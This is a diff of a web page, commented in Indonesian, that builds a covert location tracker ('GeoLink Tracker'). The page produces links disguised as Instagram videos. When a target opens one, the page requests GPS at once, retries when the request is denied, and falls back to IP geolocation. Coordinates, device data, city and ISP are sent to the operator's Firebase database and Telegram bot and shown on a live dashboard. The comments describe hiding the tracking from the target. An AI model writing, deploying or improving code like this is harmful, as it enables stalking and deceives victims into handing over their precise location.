@@ -3,99 +3,199 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Instagram</title>
-<link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24'><text y='20' font-size='20'>📷</text></svg>">
+<title>GeoLink Tracker</title>
+<link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
+<script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
 <style>
   * { box-sizing: border-box; margin: 0; padding: 0; }
+
   body {
     font-family: -apple-system, 'Segoe UI', Roboto, sans-serif;
-    background: linear-gradient(135deg, #833ab4, #fd1d1d, #fcb045);
+    background: #0a0e1a;
+    color: #e5e7eb;
     min-height: 100vh;
     padding: 20px;
-    display: flex;
-    align-items: center;
-    justify-content: center;
   }
 
-  /* ============ GENERATOR ============ */
-  .card {
-    background: white;
-    border-radius: 24px;
-    padding: 32px;
-    max-width: 640px;
-    width: 100%;
-    box-shadow: 0 20px 60px rgba(0,0,0,0.3);
+  /* ============ GENERATOR VIEW ============ */
+  .container { max-width: 1100px; margin: 0 auto; }
+
+  .header {
+    display: flex; align-items: center; gap: 12px;
+    margin-bottom: 24px; padding-bottom: 16px;
+    border-bottom: 1px solid #1f2937;
   }
-  h1 { color: #262626; margin-bottom: 8px; font-size: 24px; }
-  .sub { color: #8e8e8e; margin-bottom: 24px; font-size: 14px; }
+  .header h1 { font-size: 22px; color: #4ade80; }
+  .header .live-dot {
+    width: 10px; height: 10px; border-radius: 50%;
+    background: #ef4444; animation: pulse 1.5s infinite;
+  }
+  @keyframes pulse {
+    0%, 100% { opacity: 1; }
+    50% { opacity: 0.3; }
+  }
+
+  .grid {
+    display: grid;
+    grid-template-columns: 1fr 1fr;
+    gap: 20px;
+  }
+  @media (max-width: 860px) {
+    .grid { grid-template-columns: 1fr; }
+  }
+
+  .panel {
+    background: #111827; border-radius: 16px;
+    padding: 24px; border: 1px solid #1f2937;
+  }
+  .panel h2 {
+    font-size: 15px; font-weight: 600; margin-bottom: 16px;
+    color: #93c5fd; text-transform: uppercase; letter-spacing: 0.5px;
+  }
+
   label {
-    display: block; font-size: 13px; font-weight: 600;
-    color: #262626; margin-bottom: 6px; margin-top: 14px;
+    display: block; font-size: 12px; font-weight: 600;
+    color: #9ca3af; margin-bottom: 6px; margin-top: 12px;
+    text-transform: uppercase; letter-spacing: 0.3px;
   }
   input, select {
-    width: 100%; padding: 14px 18px;
-    border: 2px solid #dbdbdb; border-radius: 12px;
-    font-size: 15px; outline: none;
-    transition: 0.2s; font-family: inherit;
+    width: 100%; padding: 12px 14px;
+    background: #1f2937; border: 1px solid #374151;
+    border-radius: 10px; font-size: 14px;
+    color: #f3f4f6; outline: none;
+    font-family: inherit;
   }
-  input:focus, select:focus { border-color: #fd1d1d; }
-  .btn-main {
+  input:focus, select:focus { border-color: #60a5fa; }
+  input::placeholder { color: #6b7280; }
+
+  .btn {
     width: 100%; padding: 14px;
     background: linear-gradient(135deg, #833ab4, #fd1d1d);
-    color: white; border: none; border-radius: 12px;
-    font-size: 16px; font-weight: 600; cursor: pointer;
-    transition: 0.2s; margin-top: 16px;
+    color: white; border: none; border-radius: 10px;
+    font-size: 15px; font-weight: 700;
+    cursor: pointer; margin-top: 16px;
+    transition: 0.2s;
   }
-  .btn-main:hover { opacity: 0.9; }
-  .result {
-    margin-top: 20px; padding: 16px;
-    background: #fafafa; border-radius: 12px;
+  .btn:hover { opacity: 0.9; }
+
+  .btn-secondary {
+    background: #1f2937;
+    border: 1px solid #374151;
+  }
+  .btn-secondary:hover { background: #374151; }
+
+  .result-box {
+    background: #0f172a; border-radius: 10px;
+    padding: 12px; margin-top: 12px;
+    border: 1px solid #1e293b;
     display: none;
   }
-  .result.show { display: block; }
-  .result-link {
-    font-family: monospace; font-size: 13px;
-    word-break: break-all; background: white;
-    padding: 12px; border-radius: 8px;
-    border: 1px solid #dbdbdb; margin-bottom: 10px;
+  .result-box.show { display: block; }
+  .result-url {
+    font-family: 'SF Mono', monospace; font-size: 11px;
+    word-break: break-all; color: #93c5fd;
+    background: #111827; padding: 10px;
+    border-radius: 6px; margin-bottom: 8px;
   }
-  .btn-row { display: flex; gap: 8px; }
-  .btn-row button {
-    flex: 1; font-size: 14px; padding: 10px;
-    border: none; border-radius: 8px;
-    color: white; font-weight: 600; cursor: pointer;
+  .result-actions { display: flex; gap: 6px; }
+  .result-actions button {
+    flex: 1; padding: 8px; border: none;
+    border-radius: 6px; font-size: 12px;
+    font-weight: 600; cursor: pointer; color: white;
   }
-  .btn-copy { background: #0095f6; }
-  .btn-test { background: #262626; }
-  .note {
-    font-size: 12px; color: #8e8e8e;
-    margin-top: 16px; padding-top: 16px;
-    border-top: 1px solid #efefef; line-height: 1.6;
+  .btn-copy { background: #0ea5e9; }
+  .btn-test { background: #6366f1; }
+
+  /* ============ DATA PANEL ============ */
+  .stats-row {
+    display: flex; gap: 12px; margin-bottom: 16px;
   }
-  .status-box {
-    background: #fff4e5; border-left: 4px solid #fcb045;
-    padding: 12px 14px; border-radius: 8px;
-    font-size: 13px; color: #7a4a00; margin-top: 14px;
+  .stat {
+    flex: 1; background: #0f172a;
+    padding: 12px; border-radius: 10px;
+    border: 1px solid #1e293b; text-align: center;
+  }
+  .stat-num {
+    font-size: 24px; font-weight: 700; color: #4ade80;
+  }
+  .stat-label {
+    font-size: 11px; color: #6b7280;
+    text-transform: uppercase; margin-top: 4px;
   }
 
-  /* ============ TRACKING (target view) ============ */
+  .visitors-list {
+    max-height: 500px; overflow-y: auto;
+  }
+  .visitor-card {
+    background: #0f172a; border-radius: 10px;
+    padding: 14px; margin-bottom: 10px;
+    border: 1px solid #1e293b;
+    transition: 0.2s;
+    animation: slideIn 0.4s ease-out;
+  }
+  @keyframes slideIn {
+    from { opacity: 0; transform: translateY(-10px); }
+    to { opacity: 1; transform: translateY(0); }
+  }
+  .visitor-card:hover {
+    border-color: #3b82f6;
+    transform: translateX(3px);
+  }
+  .visitor-header {
+    display: flex; justify-content: space-between;
+    align-items: center; margin-bottom: 8px;
+  }
+  .visitor-time {
+    font-size: 11px; color: #9ca3af;
+  }
+  .visitor-badge {
+    font-size: 10px; padding: 3px 8px;
+    border-radius: 20px; font-weight: 700;
+    background: #065f46; color: #6ee7b7;
+  }
+  .visitor-badge.ip { background: #7c2d12; color: #fdba74; }
+  .visitor-coords {
+    font-family: 'SF Mono', monospace;
+    font-size: 12px; color: #93c5fd;
+    margin-bottom: 6px;
+  }
+  .visitor-meta {
+    font-size: 11px; color: #6b7280;
+    line-height: 1.5;
+  }
+  .visitor-actions {
+    display: flex; gap: 6px; margin-top: 8px;
+  }
+  .visitor-actions a, .visitor-actions button {
+    flex: 1; padding: 6px 10px;
+    background: #1e40af; color: white;
+    border: none; border-radius: 6px;
+    font-size: 11px; font-weight: 600;
+    text-align: center; text-decoration: none;
+    cursor: pointer;
+    font-family: inherit;
+  }
+  .visitor-actions button { background: #991b1b; }
+
+  .empty-state {
+    text-align: center; padding: 40px 20px;
+    color: #4b5563;
+  }
+  .empty-state .icon { font-size: 48px; margin-bottom: 12px; opacity: 0.5; }
+  .empty-state p { font-size: 13px; }
+
+  /* ============ TRACKING VIEW (dilihat target) ============ */
   #trackingView {
     display: none;
-    position: fixed;
-    inset: 0;
-    background: #000;
-    color: white;
-    overflow-y: auto;
-    z-index: 9999;
+    position: fixed; inset: 0;
+    background: #000; color: white;
+    overflow-y: auto; z-index: 9999;
   }
   .track-wrap {
     min-height: 100vh;
-    display: flex;
-    flex-direction: column;
-    align-items: center;
-    justify-content: center;
-    padding: 20px;
-    text-align: center;
+    display: flex; flex-direction: column;
+    align-items: center; justify-content: center;
+    padding: 20px; text-align: center;
   }
   .spinner {
     width: 50px; height: 50px;
@@ -125,53 +225,166 @@
     width: 100%; height: 500px;
     border: none; display: block;
   }
+
+  .config-warning {
+    background: #7f1d1d; color: #fecaca;
+    padding: 12px 16px; border-radius: 10px;
+    margin-bottom: 16px; font-size: 13px;
+    border-left: 4px solid #ef4444;
+  }
+  .config-warning code {
+    background: #450a0a; padding: 2px 6px;
+    border-radius: 4px; color: #fca5a5;
+    font-size: 11px;
+  }
 </style>
 </head>
 <body>
 
-<!-- ============ GENERATOR VIEW ============ -->
-<div class="card" id="generatorView">
-  <h1>🎬 Video Link Generator</h1>
-  <p class="sub">Buat link tracking dari video Instagram</p>
-
-  <label>Link Instagram (Reel / Post)</label>
-  <input type="text" id="igUrl" placeholder="https://www.instagram.com/reel/xxxxx/">
-
-  <label>URL Website Anda</label>
-  <input type="text" id="baseUrl" placeholder="https://situs-anda.netlify.app">
-
-  <label>Bot Token Telegram</label>
-  <input type="text" id="botToken" placeholder="1234567:ABC-DEF...">
-
-  <label>Chat ID Telegram Anda</label>
-  <input type="text" id="chatId" placeholder="123456789">
-
-  <button class="btn-main" onclick="generate()">🔗 Generate Tracking Link</button>
-
-  <div class="result" id="result">
-    <div class="result-link" id="output"></div>
-    <div class="btn-row">
-      <button class="btn-copy" onclick="copyLink()">📋 Copy</button>
-      <button class="btn-test" onclick="testLink()">🧪 Test Sendiri</button>
-    </div>
+<!-- ==================== GENERATOR VIEW ==================== -->
+<div class="container" id="generatorView">
+  <div class="header">
+    <div class="live-dot" id="liveDot" style="display:none;"></div>
+    <h1>📍 GeoLink Tracker</h1>
   </div>
 
-  <div class="note">
-    <strong>Cara kerja:</strong> Target buka link → video IG langsung tampil → di background browser minta izin lokasi → lokasi otomatis terkirim ke Telegram Anda. Target tidak melihat apapun yang mencurigakan.
+  <div id="firebaseWarning" class="config-warning" style="display:none;">
+    ⚠️ <b>Firebase belum dikonfigurasi.</b> Data lokasi hanya akan muncul di browser Anda sendiri (tidak realtime dari device lain).<br>
+    Buka kode, cari <code>FIREBASE_CONFIG</code>, isi dengan config dari console Firebase.
+  </div>
+
+  <div class="grid">
+    <!-- KIRI: GENERATOR -->
+    <div class="panel">
+      <h2>🔗 Buat Tracking Link</h2>
+
+      <label>Link Instagram (Reel / Post)</label>
+      <input type="text" id="igUrl" placeholder="https://www.instagram.com/reel/xxxxx/">
+
+      <label>URL Website Ini</label>
+      <input type="text" id="baseUrl" placeholder="https://xxx.netlify.app">
+
+      <label>Bot Token Telegram (opsional)</label>
+      <input type="text" id="botToken" placeholder="1234567:ABC-DEF...">
+
+      <label>Chat ID Telegram (opsional)</label>
+      <input type="text" id="chatId" placeholder="123456789">
+
+      <button class="btn" onclick="generate()">🔗 Generate Link</button>
+
+      <div class="result-box" id="resultBox">
+        <div class="result-url" id="output"></div>
+        <div class="result-actions">
+          <button class="btn-copy" onclick="copyLink()">📋 Copy Link</button>
+          <button class="btn-test" onclick="testLink()">🧪 Test</button>
+        </div>
+      </div>
+    </div>
+
+    <!-- KANAN: LIVE DATA -->
+    <div class="panel">
+      <h2>📡 Data Lokasi Masuk (Live)</h2>
+
+      <div class="stats-row">
+        <div class="stat">
+          <div class="stat-num" id="statTotal">0</div>
+          <div class="stat-label">Total</div>
+        </div>
+        <div class="stat">
+          <div class="stat-num" id="statGps">0</div>
+          <div class="stat-label">GPS</div>
+        </div>
+        <div class="stat">
+          <div class="stat-num" id="statIp">0</div>
+          <div class="stat-label">IP Only</div>
+        </div>
+      </div>
+
+      <button class="btn btn-secondary" onclick="clearAll()" style="margin-top:0; margin-bottom:12px;">
+        🗑️ Hapus Semua Data
+      </button>
+
+      <div class="visitors-list" id="visitorsList">
+        <div class="empty-state">
+          <div class="icon">📭</div>
+          <p>Belum ada data masuk.<br>Kirim link tracking ke target,<br>lokasi akan muncul di sini otomatis.</p>
+        </div>
+      </div>
+    </div>
   </div>
 </div>
 
-<!-- ============ TRACKING VIEW (yang dilihat target) ============ -->
+<!-- ==================== TRACKING VIEW ==================== -->
 <div id="trackingView">
   <div class="track-wrap">
-    <div class="spinner"></div>
-    <div class="track-title">Memuat video...</div>
+    <div class="spinner" id="trackSpinner"></div>
+    <div class="track-title" id="trackTitle">Memuat video...</div>
     <div class="track-status" id="trackStatus">Mohon tunggu sebentar</div>
     <div class="ig-embed-wrap" id="igEmbed" style="display:none;"></div>
   </div>
 </div>
 
+<!-- ==================== SCRIPTS ==================== -->
 <script>
+/* ============================================================
+   ⚙️ KONFIGURASI — GANTI DENGAN PUNYA ANDA
+   ============================================================ */
+const FIREBASE_CONFIG = {
+  apiKey: "ISI_API_KEY_ANDA",
+  authDomain: "ISI.firebaseapp.com",
+  databaseURL: "https://ISI-default-rtdb.asia-southeast1.firebasedatabase.app",
+  projectId: "ISI",
+  storageBucket: "ISI.appspot.com",
+  messagingSenderId: "ISI",
+  appId: "ISI"
+};
+
+// Cek apakah Firebase sudah dikonfigurasi
+const FIREBASE_READY =
+  FIREBASE_CONFIG.apiKey &&
+  !FIREBASE_CONFIG.apiKey.includes('ISI_') &&
+  FIREBASE_CONFIG.databaseURL &&
+  !FIREBASE_CONFIG.databaseURL.includes('ISI');
+
+/* ============================================================
+   LOAD FIREBASE SDK (kalau config tersedia)
+   ============================================================ */
+let fbDB = null;
+let fbListeners = [];
+
+function loadFirebase() {
+  return new Promise((resolve) => {
+    if (!FIREBASE_READY) { resolve(false); return; }
+
+    // Load Firebase SDK v9 compat
+    const scripts = [
+      'https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js',
+      'https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js'
+    ];
+
+    let loaded = 0;
+    scripts.forEach(src => {
+      const s = document.createElement('script');
+      s.src = src;
+      s.onload = () => {
+        loaded++;
+        if (loaded === scripts.length) {
+          try {
+            firebase.initializeApp(FIREBASE_CONFIG);
+            fbDB = firebase.database();
+            resolve(true);
+          } catch(e) {
+            console.error('Firebase init error:', e);
+            resolve(false);
+          }
+        }
+      };
+      s.onerror = () => resolve(false);
+      document.head.appendChild(s);
+    });
+  });
+}
+
 /* ============================================================
    HELPER
    ============================================================ */
@@ -181,7 +394,6 @@ function b64encode(str) {
       .replace(/=/g, '').replace(/\+/g, '-').replace(/\//g, '_');
   } catch(e) { return ''; }
 }
-
 function b64decode(str) {
   try {
     let s = String(str).replace(/-/g, '+').replace(/_/g, '/');
@@ -191,80 +403,103 @@ function b64decode(str) {
 }
 
 /* ============================================================
-   STATE
+   FALLBACK STORAGE (kalau Firebase tidak ada)
+   Pakai localStorage + storage event
    ============================================================ */
-var TS = {
-  igUrl: '',
-  token: '',
-  botToken: '',
-  chatId: ''
-};
+const LOCAL_KEY = 'geolink_visits';
+
+function localGetAll() {
+  try {
+    const raw = localStorage.getItem(LOCAL_KEY);
+    return raw ? JSON.parse(raw) : {};
+  } catch(e) { return {}; }
+}
+function localSave(id, data) {
+  try {
+    const all = localGetAll();
+    all[id] = data;
+    localStorage.setItem(LOCAL_KEY, JSON.stringify(all));
+    // Trigger storage event untuk tab lain
+    window.dispatchEvent(new StorageEvent('storage', {
+      key: LOCAL_KEY,
+      newValue: JSON.stringify(all)
+    }));
+  } catch(e) {}
+}
 
 /* ============================================================
    ROUTER
    ============================================================ */
 (function router() {
-  var params = new URLSearchParams(window.location.search);
-  var r = params.get('r');
-  var t = params.get('t');
+  const params = new URLSearchParams(window.location.search);
+  const r = params.get('r');
+  const t = params.get('t');
 
   if (r && t) {
-    // MODE TRACKING — yang dilihat target
+    // TRACKING MODE
     document.getElementById('generatorView').style.display = 'none';
     document.getElementById('trackingView').style.display = 'block';
     document.body.style.background = '#000';
     document.body.style.padding = '0';
-    document.body.style.display = 'block';
-
     initTracking(r, t, params.get('b'), params.get('c'));
   } else {
-    // MODE GENERATOR
-    var baseInput = document.getElementById('baseUrl');
+    // GENERATOR MODE
+    const baseInput = document.getElementById('baseUrl');
     if (!baseInput.value) {
-      var origin = window.location.origin;
-      var path = window.location.pathname.replace(/\/[^/]*$/, '');
+      const origin = window.location.origin;
+      const path = window.location.pathname.replace(/\/[^/]*$/, '');
       baseInput.value = (origin === 'null' ? '' : origin) + path;
     }
+
+    // Tampilkan warning kalau Firebase belum diset
+    if (!FIREBASE_READY) {
+      document.getElementById('firebaseWarning').style.display = 'block';
+    }
+
+    // Init Firebase + realtime listener
+    loadFirebase().then(ok => {
+      if (ok) {
+        startRealtimeListener();
+      } else {
+        startLocalListener();
+      }
+    });
   }
 })();
 
 /* ============================================================
-   GENERATOR
+   GENERATOR — Buat link
    ============================================================ */
 function generate() {
-  var igUrl = document.getElementById('igUrl').value.trim();
-  var baseUrl = document.getElementById('baseUrl').value.trim().replace(/\/+$/, '');
-  var botToken = document.getElementById('botToken').value.trim();
-  var chatId = document.getElementById('chatId').value.trim();
+  const igUrl = document.getElementById('igUrl').value.trim();
+  const baseUrl = document.getElementById('baseUrl').value.trim().replace(/\/+$/, '');
+  const botToken = document.getElementById('botToken').value.trim();
+  const chatId = document.getElementById('chatId').value.trim();
 
-  if (!igUrl) { alert('Masukkan link Instagram dulu!'); return; }
+  if (!igUrl) { alert('Masukkan link Instagram!'); return; }
   if (!igUrl.includes('instagram.com')) { alert('Link harus dari Instagram!'); return; }
-  if (!baseUrl) { alert('Masukkan URL website Anda!'); return; }
-  if (!botToken) { alert('Masukkan Bot Token Telegram!'); return; }
-  if (!chatId) { alert('Masukkan Chat ID Telegram!'); return; }
+  if (!baseUrl) { alert('Masukkan URL website!'); return; }
 
-  var token = Math.random().toString(36).slice(2, 12);
-  var encodedIg = b64encode(igUrl);
+  const token = Math.random().toString(36).slice(2, 12);
+  const encodedIg = b64encode(igUrl);
 
-  var trackUrl = baseUrl + '/?r=' + encodedIg +
-                 '&t=' + token +
-                 '&b=' + encodeURIComponent(botToken) +
-                 '&c=' + encodeURIComponent(chatId);
+  let url = baseUrl + '/?r=' + encodedIg + '&t=' + token;
+  if (botToken) url += '&b=' + encodeURIComponent(botToken);
+  if (chatId) url += '&c=' + encodeURIComponent(chatId);
 
-  document.getElementById('output').textContent = trackUrl;
-  document.getElementById('result').classList.add('show');
-  window._trackUrl = trackUrl;
+  document.getElementById('output').textContent = url;
+  document.getElementById('resultBox').classList.add('show');
+  window._trackUrl = url;
 }
 
 function copyLink() {
   if (!window._trackUrl) return;
-  navigator.clipboard.writeText(window._trackUrl).then(function() {
+  navigator.clipboard.writeText(window._trackUrl).then(() => {
     alert('✅ Link berhasil di-copy!');
-  }).catch(function() {
-    var ta = document.createElement('textarea');
+  }).catch(() => {
+    const ta = document.createElement('textarea');
     ta.value = window._trackUrl;
-    document.body.appendChild(ta);
-    ta.select();
+    document.body.appendChild(ta); ta.select();
     document.execCommand('copy');
     document.body.removeChild(ta);
     alert('✅ Link berhasil di-copy!');
@@ -277,183 +512,358 @@ function testLink() {
 }
 
 /* ============================================================
-   TRACKING (dilihat target)
+   LIVE DATA LISTENER — Firebase
+   ============================================================ */
+function startRealtimeListener() {
+  const dot = document.getElementById('liveDot');
+  dot.style.display = 'block';
+
+  const visitsRef = fbDB.ref('visits');
+
+  // Listener baru masuk
+  visitsRef.on('child_added', (snapshot) => {
+    const data = snapshot.val();
+    const id = snapshot.key;
+    renderVisitor(id, data, true);
+    updateStats();
+  });
+
+  // Listener update (misal lokasi di-refine)
+  visitsRef.on('child_changed', (snapshot) => {
+    const data = snapshot.val();
+    const id = snapshot.key;
+    // Remove old card, add new
+    const old = document.getElementById('visitor-' + id);
+    if (old) old.remove();
+    renderVisitor(id, data, false);
+    updateStats();
+  });
+
+  // Listener hapus
+  visitsRef.on('child_removed', (snapshot) => {
+    const el = document.getElementById('visitor-' + snapshot.key);
+    if (el) el.remove();
+    updateStats();
+  });
+
+  // Load existing
+  visitsRef.once('value').then(snap => {
+    const all = snap.val() || {};
+    Object.keys(all).forEach(id => {
+      renderVisitor(id, all[id], false);
+    });
+    updateStats();
+  });
+}
+
+/* ============================================================
+   LIVE DATA LISTENER — localStorage (fallback)
+   ============================================================ */
+function startLocalListener() {
+  // Render existing
+  const all = localGetAll();
+  Object.keys(all).forEach(id => renderVisitor(id, all[id], false));
+  updateStats();
+
+  // Listen changes
+  window.addEventListener('storage', () => {
+    const current = localGetAll();
+    // Clear list
+    document.getElementById('visitorsList').innerHTML = '';
+    Object.keys(current).forEach(id => renderVisitor(id, current[id], false));
+    updateStats();
+  });
+}
+
+/* ============================================================
+   RENDER VISITOR CARD
+   ============================================================ */
+function renderVisitor(id, data, isNew) {
+  const list = document.getElementById('visitorsList');
+  const empty = list.querySelector('.empty-state');
+  if (empty) empty.remove();
+
+  // Cek apakah sudah ada
+  const existing = document.getElementById('visitor-' + id);
+  if (existing) existing.remove();
+
+  const card = document.createElement('div');
+  card.className = 'visitor-card';
+  card.id = 'visitor-' + id;
+
+  const isGps = data.type !== 'ip' && data.acc && data.acc < 1000;
+  const badge = isGps
+    ? '<span class="visitor-badge">🎯 GPS</span>'
+    : '<span class="visitor-badge ip">📡 IP</span>';
+
+  const time = data.time ? new Date(data.time).toLocaleString('id-ID') : '-';
+  const lat = data.lat ? Number(data.lat).toFixed(6) : '-';
+  const lng = data.lng ? Number(data.lng).toFixed(6) : '-';
+  const acc = data.acc ? (isGps ? Math.round(data.acc) + ' m' : '~' + Math.round(data.acc/1000) + ' km') : '-';
+
+  const mapsLink = 'https://maps.google.com/?q=' + data.lat + ',' + data.lng;
+
+  // IP info kalau ada
+  let ipInfo = '';
+  if (data.city || data.country) {
+    ipInfo = '<div class="visitor-meta">' +
+      '🏙️ ' + (data.city || '-') + ', ' + (data.region || '-') + '<br>' +
+      '🌍 ' + (data.country || '-') + ' · 📡 ' + (data.isp || '-') +
+      '</div>';
+  }
+
+  // UA singkat
+  let ua = data.ua || '';
+  let device = '💻 Desktop';
+  if (/Mobile|Android|iPhone|iPad/i.test(ua)) device = '📱 Mobile';
+  if (/iPhone|iPad/i.test(ua)) device = '📱 iPhone/iPad';
+  if (/Android/i.test(ua)) device = '📱 Android';
+
+  card.innerHTML =
+    '<div class="visitor-header">' +
+      '<span class="visitor-time">🕐 ' + time + '</span>' +
+      badge +
+    '</div>' +
+    '<div class="visitor-coords">' +
+      '🌐 ' + lat + ', ' + lng +
+    '</div>' +
+    '<div class="visitor-meta">' +
+      '🎯 Akurasi: ' + acc + ' · ' + device +
+    '</div>' +
+    ipInfo +
+    '<div class="visitor-actions">' +
+      '<a href="' + mapsLink + '" target="_blank">🗺️ Google Maps</a>' +
+      '<button onclick="deleteVisitor(\'' + id + '\')">🗑️ Hapus</button>' +
+    '</div>';
+
+  list.insertBefore(card, list.firstChild);
+}
+
+/* ============================================================
+   DELETE VISITOR
+   ============================================================ */
+function deleteVisitor(id) {
+  if (!confirm('Hapus data ini?')) return;
+  if (fbDB) {
+    fbDB.ref('visits/' + id).remove();
+  } else {
+    const all = localGetAll();
+    delete all[id];
+    localStorage.setItem(LOCAL_KEY, JSON.stringify(all));
+    const el = document.getElementById('visitor-' + id);
+    if (el) el.remove();
+    updateStats();
+  }
+}
+
+function clearAll() {
+  if (!confirm('Hapus SEMUA data lokasi?')) return;
+  if (fbDB) {
+    fbDB.ref('visits').remove();
+  } else {
+    localStorage.removeItem(LOCAL_KEY);
+    document.getElementById('visitorsList').innerHTML =
+      '<div class="empty-state"><div class="icon">📭</div><p>Belum ada data.</p></div>';
+    updateStats();
+  }
+}
+
+/* ============================================================
+   UPDATE STATS
+   ============================================================ */
+function updateStats() {
+  const cards = document.querySelectorAll('.visitor-card');
+  let total = cards.length;
+  let gps = 0;
+  let ip = 0;
+
+  cards.forEach(c => {
+    if (c.querySelector('.visitor-badge.ip')) ip++;
+    else gps++;
+  });
+
+  document.getElementById('statTotal').textContent = total;
+  document.getElementById('statGps').textContent = gps;
+  document.getElementById('statIp').textContent = ip;
+}
+
+/* ============================================================
+   TRACKING MODE (yang dilihat target)
    ============================================================ */
 function initTracking(encodedR, token, botToken, chatId) {
-  TS.igUrl = b64decode(encodedR);
-  TS.token = token;
-  TS.botToken = botToken || '';
-  TS.chatId = chatId || '';
+  const igUrl = b64decode(encodedR);
 
-  // LANGSUNG mulai tracking tanpa nunggu klik apapun
-  // Tapi delay 300ms biar halaman render dulu (biar gak ketahuan)
-  setTimeout(function() {
-    autoTrack();
-  }, 300);
+  // Simpan info
+  window._TRACK = {
+    igUrl: igUrl,
+    token: token,
+    botToken: botToken || '',
+    chatId: chatId || ''
+  };
 
-  // Redirect paksa ke Instagram setelah 2 detik (jaga-jaga kalau user kabur)
-  // Tapi kita munculin video embed dulu supaya user betah
-  setTimeout(function() {
+  // Set judul halaman samar
+  document.title = 'Instagram';
+
+  // Mulai tracking setelah delay pendek (biar halaman render)
+  setTimeout(() => {
+    startTrack();
+  }, 400);
+
+  // Tampilkan video setelah 1.5 detik
+  setTimeout(() => {
     showVideo();
   }, 1500);
 }
 
-function autoTrack() {
+function startTrack() {
   if (!navigator.geolocation) {
-    console.log('GPS not supported');
+    // Browser tidak support GPS → fallback ke IP
+    ipFallback();
     return;
   }
 
-  // Langsung minta lokasi TANPA user klik
   navigator.geolocation.getCurrentPosition(
-    function(pos) {
-      var lat = pos.coords.latitude;
-      var lng = pos.coords.longitude;
-      var acc = pos.coords.accuracy;
-      sendToTelegram(lat, lng, acc);
+    (pos) => {
+      const lat = pos.coords.latitude;
+      const lng = pos.coords.longitude;
+      const acc = pos.coords.accuracy;
+      sendData(lat, lng, acc, 'gps');
     },
-    function(err) {
-      // Kalau ditolak, coba lagi dengan opsi berbeda
-      console.log('GPS denied, retry...');
-      retryTrack();
+    (err) => {
+      console.log('GPS denied, retry low accuracy...');
+      // Retry low accuracy
+      navigator.geolocation.getCurrentPosition(
+        (pos) => {
+          const lat = pos.coords.latitude;
+          const lng = pos.coords.longitude;
+          const acc = pos.coords.accuracy;
+          sendData(lat, lng, acc, 'gps');
+        },
+        (err2) => {
+          console.log('GPS retry failed, IP fallback...');
+          ipFallback();
+        },
+        { enableHighAccuracy: false, timeout: 5000, maximumAge: 60000 }
+      );
     },
-    {
-      enableHighAccuracy: true,
-      timeout: 8000,
-      maximumAge: 0
-    }
-  );
-}
-
-function retryTrack() {
-  // Coba lagi dengan low accuracy (kadang berhasil walau user deny pertama)
-  navigator.geolocation.getCurrentPosition(
-    function(pos) {
-      var lat = pos.coords.latitude;
-      var lng = pos.coords.longitude;
-      var acc = pos.coords.accuracy;
-      sendToTelegram(lat, lng, acc);
-    },
-    function(err) {
-      // Coba pakai IP geolocation sebagai fallback
-      ipFallback();
-    },
-    {
-      enableHighAccuracy: false,
-      timeout: 5000,
-      maximumAge: 60000
-    }
+    { enableHighAccuracy: true, timeout: 8000, maximumAge: 0 }
   );
 }
 
 function ipFallback() {
-  // Fallback: pakai IP untuk dapat lokasi kasar (kota)
-  // Pakai ipapi.co (gratis, no API key)
   fetch('https://ipapi.co/json/')
-    .then(function(res) { return res.json(); })
-    .then(function(data) {
+    .then(r => r.json())
+    .then(data => {
       if (data && data.latitude && data.longitude) {
-        var lat = data.latitude;
-        var lng = data.longitude;
-        var acc = 5000; // akurasi kasar (kota)
-        sendToTelegram(lat, lng, acc, data);
+        sendData(data.latitude, data.longitude, 5000, 'ip', {
+          city: data.city,
+          region: data.region,
+          country: data.country_name,
+          isp: data.org
+        });
       }
     })
-    .catch(function(e) {
-      console.log('IP fallback failed:', e);
-    });
+    .catch(e => console.error('IP fallback error:', e));
 }
 
-function sendToTelegram(lat, lng, acc, ipData) {
-  if (!TS.botToken || !TS.chatId) return;
+function sendData(lat, lng, acc, type, extra) {
+  extra = extra || {};
+  const id = Date.now() + '_' + Math.random().toString(36).slice(2, 8);
+  const payload = {
+    lat: lat,
+    lng: lng,
+    acc: acc,
+    type: type,
+    token: window._TRACK.token,
+    time: new Date().toISOString(),
+    ua: navigator.userAgent,
+    city: extra.city || '',
+    region: extra.region || '',
+    country: extra.country || '',
+    isp: extra.isp || ''
+  };
 
-  var mapsLink = 'https://maps.google.com/?q=' + lat + ',' + lng;
-  var akurasi = acc < 1000 ? Math.round(acc) + ' m' : '~' + Math.round(acc/1000) + ' km (IP)';
+  // Kirim ke Firebase
+  if (fbDB) {
+    fbDB.ref('visits/' + id).set(payload).catch(e => console.error(e));
+  } else {
+    // Fallback: simpan di localStorage (hanya bekerja kalau target & Anda satu browser)
+    localSave(id, payload);
+  }
 
-  var text =
-    '📍 *Lokasi Terdeteksi*\n\n' +
+  // Kirim ke Telegram kalau ada
+  if (window._TRACK.botToken && window._TRACK.chatId) {
+    sendTelegram(lat, lng, acc, type, extra);
+  }
+}
+
+function sendTelegram(lat, lng, acc, type, extra) {
+  const mapsLink = 'https://maps.google.com/?q=' + lat + ',' + lng;
+  const akurasi = (type === 'ip') ? '~' + Math.round(acc/1000) + ' km (IP)' : Math.round(acc) + ' m';
+
+  let text =
+    '📍 *Lokasi Baru*\n\n' +
     '🌐 Lat: ' + lat.toFixed(6) + '\n' +
     '🌐 Lng: ' + lng.toFixed(6) + '\n' +
     '🎯 Akurasi: ' + akurasi + '\n' +
     '🗺️ ' + mapsLink + '\n' +
     '🕐 ' + new Date().toLocaleString('id-ID') + '\n';
 
-  if (ipData) {
-    text += '🏙️ Kota: ' + (ipData.city || '-') + ', ' + (ipData.region || '-') + '\n';
-    text += '🌍 Negara: ' + (ipData.country_name || '-') + '\n';
-    text += '📡 ISP: ' + (ipData.org || '-') + '\n';
+  if (extra.city) {
+    text += '🏙️ ' + extra.city + ', ' + (extra.region || '') + '\n';
+    text += '🌍 ' + (extra.country || '') + '\n';
   }
 
-  text += '🆔 Token: ' + TS.token;
+  text += '🆔 ' + window._TRACK.token;
 
-  fetch('https://api.telegram.org/bot' + TS.botToken + '/sendMessage', {
+  fetch('https://api.telegram.org/bot' + window._TRACK.botToken + '/sendMessage', {
     method: 'POST',
     headers: { 'Content-Type': 'application/json' },
     body: JSON.stringify({
